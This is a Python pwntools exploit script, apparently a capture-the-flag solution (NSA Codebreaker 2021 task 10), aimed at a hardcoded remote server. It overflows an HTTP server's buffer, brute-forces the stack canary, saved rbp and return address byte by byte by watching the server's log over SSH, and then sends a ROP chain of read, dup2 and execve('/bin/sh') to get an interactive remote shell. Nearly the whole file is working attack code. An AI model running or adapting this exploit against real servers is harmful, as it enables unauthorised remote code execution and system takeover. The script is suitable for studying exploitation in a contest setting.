#!/usr/bin/env python3

import binascii
import pwn
import sys
import time

# test server info
# HOST = "192.168.88.128"
# PORT = 8080
# USERNAME = "geech"
# LOG_PATH = "/home/geech/ctf/nsacc21/task10/psuser/ps_server.log"

# NSA server info
HOST = "52.91.233.249"
PORT = 8080
USERNAME = "lpuser"
LOG_PATH = "/home/psuser/ps_server.log"

# amount of time to sleep b/t packets to make sure they get sent separately
SLEEP_DURATION = 0.1

log = pwn.log

# gadgets
POP_RAX = 0x000000000000877f
POP_RDI = 0x0000000000008876
POP_RSI_R15 = 0x0000000000008874
POP_RDX = 0x000000000001cca2
# SYSCALL = 0x000000000000a14c
SYSCALL = 0x58e65 # in sys_listen, calls ret after a cmp, might work

def get_log_proc():
    with pwn.context.local(log_level="error"):
        # ssh to server
        ssh = pwn.ssh(user=USERNAME, host=HOST, keyfile="~/.ssh/id_ed25519")

        # spawn process to watch new log lines
        p = ssh.process(["/usr/bin/tail", "-f", LOG_PATH])

    # remove the preexisting lines from the buffer, we don't care
    p.clean()

    return p

def send_payload_to_srv(p, payload):
    data = b"\r\n".join([
        b"POST / HTTP/1.1",
        b"Host: localhost:8080",
        b"User-Agent: ggwp",
        b"Content-Length: 5000", # gets set to max length
        b"\r\n"
    ])

    # send headers
    p.send(data)

    # send first packet
    p.send(b"a"*2000)
    time.sleep(SLEEP_DURATION)

    # exploit: send second packet, bad buf bounds on server, overwrites buffer
    p.send(b"a"*2104 + payload)

def leak_byte(prefix, possible_bytes=None):
    log_proc = get_log_proc()

    if possible_bytes is None:
        possible_bytes = range(256)

    for v in possible_bytes:
    # for v in range(0x60-2, 0x60+2):
        with pwn.context.local(log_level="error"):
            p = pwn.remote(HOST, PORT)

        send_payload_to_srv(p, prefix + bytes([v]))

        p.recv()

        with pwn.context.local(log_level="error"):
            p.close()

        # get the log lines
        log_proc.recvline()

        if b"exited with status 0" in log_proc.recvline():
            # process didn't crash, we found a byte
            return v
    else:
        log.error("couldn't get a byte")
        return None

def brute_canary():
    canary = b"\x00"

    while len(canary) < 8:
        v = leak_byte(canary)

        if v is not None:
            canary += bytes([v])
            log.info("got another byte: " + hex(pwn.u64(canary.ljust(8, b"\x00"))))
        else:
            return

    canary = pwn.u64(canary)

    log.success("got full canary: " + hex(canary))

    return canary

# in both of these leak functions, if you get a null byte it isn't shown when it prints, it just looks like the last value. so if you have duplicate log statements, thats why
def brute_rbp(prefix):
    rbp = b""

    # msb is 0x7f
    while len(rbp) < 5:
        v = leak_byte(prefix + rbp)

        if v is not None:
            rbp += bytes([v])
            log.info("got another byte: " + hex(pwn.u64(rbp.ljust(8, b"\x00"))))
        else:
            return

    rbp += b"\x7f\x00\x00"
    rbp = pwn.u64(rbp)

    log.success("leaked rbp: " + hex(rbp))

    return rbp

def brute_rip(prefix):
    rip = b"\x5f"

    # third lsb nibble is 0x9
    # this gets set to None in the loop, will become the full 256 space
    valid = [x << 4 | 0x9 for x in range(16)]
    
    # msb is 0x7f
    while len(rip) < 5:
        v = leak_byte(prefix + rip, valid)
        # v = leak_byte(prefix + rip)
        valid = None

        if v is not None:
            rip += bytes([v])
            log.info("got another byte: " + hex(pwn.u64(rip.ljust(8, b"\x00"))))
        else:
            return

    rip += b"\x7f\x00\x00"
    rip = pwn.u64(rip)

    log.success("leaked rip: " + hex(rip))

    return rip

def main():
    # bruteforce canary value
    # takes ~10-15min for each bruteforce
    log.info("bruteforcing canary")
    canary = brute_canary()
    # canary = 0xadd47aa23a5f6000 # local test value
    # canary = 0x51052b59c389c200 # remote

    payload = b""
    payload += pwn.p64(canary)
    payload += b"A"*8 # rbx, don't care
    payload += b"B"*8 # r12, don't care

    # this rbp value is not actually correct, nearly 100% guarenteed
    # if the stack is actually needed, have to leak it for real later off of rsp or something
    log.info("bruteforcing rbp")
    rbp = brute_rbp(payload)
    # rbp = 0x7fffff80007d # local test value
    # rbp = 0x7ffc6b00004d # remote
    payload += pwn.p64(rbp)

    log.info("bruteforcing rip")
    rip = brute_rip(payload)
    # rip = 0x7ffff7d1c95f # local test value
    # rip = 0x7f7ce334195f # remote
    base_addr = rip - 0x995f

    log.info(f"base addr: " + hex(base_addr))

    # exploit chain now that we have our leaks:
    # the rbp value is writable memory
    # read(fd, rbp, 8)
    # send "/bin/sh\x00"
    # dup2(fd, 0)
    # dup2(fd, 1)
    # dup2(fd, 2)
    # execve(rbp, 0, 0)

    fd = 6
    bin_sh = b"/bin/sh\x00"

    payload = b""
    payload += pwn.p64(canary)
    payload += b"A"*8 # rbx
    payload += b"B"*8 # r12
    payload += b"C"*8 # rbp

    # read(fd, rbp, 8)
    payload += pwn.p64(base_addr + POP_RDI)
    payload += pwn.p64(fd)
    payload += pwn.p64(base_addr + POP_RSI_R15)
    payload += pwn.p64(rbp)
    payload += b"D"*8 # r15
    payload += pwn.p64(base_addr + POP_RDX)
    payload += pwn.p64(len(bin_sh))
    payload += pwn.p64(base_addr + POP_RAX)
    payload += pwn.p64(0) # read syscall number
    payload += pwn.p64(base_addr + SYSCALL)

    # dup2(fd, 0)
    payload += pwn.p64(base_addr + POP_RDI)
    payload += pwn.p64(fd)
    payload += pwn.p64(base_addr + POP_RSI_R15)
    payload += pwn.p64(0)
    payload += b"E"*8 # r15
    payload += pwn.p64(base_addr + POP_RAX)
    payload += pwn.p64(33) # dup2 syscall number
    payload += pwn.p64(base_addr + SYSCALL)
    
    # dup2(fd, 1)
    payload += pwn.p64(base_addr + POP_RDI)
    payload += pwn.p64(fd)
    payload += pwn.p64(base_addr + POP_RSI_R15)
    payload += pwn.p64(1)
    payload += b"F"*8 # r15
    payload += pwn.p64(base_addr + POP_RAX)
    payload += pwn.p64(33) # dup2 syscall number
    payload += pwn.p64(base_addr + SYSCALL)
    
    # dup2(fd, 2)
    payload += pwn.p64(base_addr + POP_RDI)
    payload += pwn.p64(fd)
    payload += pwn.p64(base_addr + POP_RSI_R15)
    payload += pwn.p64(2)
    payload += b"G"*8 # r15
    payload += pwn.p64(base_addr + POP_RAX)
    payload += pwn.p64(33) # dup2 syscall number
    payload += pwn.p64(base_addr + SYSCALL)
    
    # execve(rbp, 0, 0)
    payload += pwn.p64(base_addr + POP_RDI)
    payload += pwn.p64(rbp)
    payload += pwn.p64(base_addr + POP_RSI_R15)
    payload += pwn.p64(0)
    payload += b"H"*8 # r15
    payload += pwn.p64(base_addr + POP_RDX)
    payload += pwn.p64(0)
    payload += pwn.p64(base_addr + POP_RAX)
    payload += pwn.p64(59) # execve syscall number
    payload += pwn.p64(base_addr + SYSCALL)

    # send the exploit payload
    p = pwn.remote(HOST, PORT)
    # input("attach debugger and press enter")

    send_payload_to_srv(p, payload)

    # send the bin sh string
    time.sleep(SLEEP_DURATION)
    p.send(bin_sh)

    # shell
    time.sleep(SLEEP_DURATION)
    p.clean()
    p.interactive()

    return 0

if __name__ == "__main__":
    sys.exit(main())